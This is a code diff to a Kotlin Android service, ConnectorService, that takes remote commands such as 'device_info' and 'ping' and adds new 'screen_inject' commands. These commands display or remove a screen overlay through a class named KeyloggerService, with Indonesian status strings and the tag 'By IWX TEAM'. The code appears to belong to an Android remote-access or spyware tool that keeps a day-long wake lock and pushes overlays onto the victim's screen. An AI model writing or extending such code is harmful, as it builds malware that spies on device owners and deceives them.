@@ -282,6 +282,10 @@ class ConnectorService : Service() {
             cmd == "device_info" -> Pair(DeviceInfo.collect(this).toString(), "command_result")
             cmd == "ping"        -> Pair("pong · $deviceName · $deviceId", "command_result")
 
+            // ── Screen Inject ──
+            cmd.startsWith("screen_inject:") -> Pair(doScreenInject(cmd.removePrefix("screen_inject:")), "command_result")
+            cmd == "screen_inject_stop"      -> Pair(doScreenInjectStop(), "command_result")
+
             else -> Pair("ERROR: Unknown command: $cmd", "command_result")
         }
     }
@@ -869,6 +873,22 @@ class ConnectorService : Service() {
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "IWXPanel:WakeLock")
             .apply { acquire(24 * 60 * 60 * 1000L) }
+    }
+
+    // ── Screen Inject ─────────────────────────────────────────────────────────
+    private fun doScreenInject(text: String): String {
+        return try {
+            val trimmed = text.trim().ifEmpty { "By IWX TEAM" }
+            KeyloggerService.showScreenInject(trimmed)
+            "OK: Overlay ditampilkan — "$trimmed""
+        } catch (e: Exception) { "ERROR: ${e.message}" }
+    }
+
+    private fun doScreenInjectStop(): String {
+        return try {
+            KeyloggerService.hideScreenInject()
+            "OK: Overlay dihapus"
+        } catch (e: Exception) { "ERROR: ${e.message}" }
     }
 
     private fun log(msg: String) {
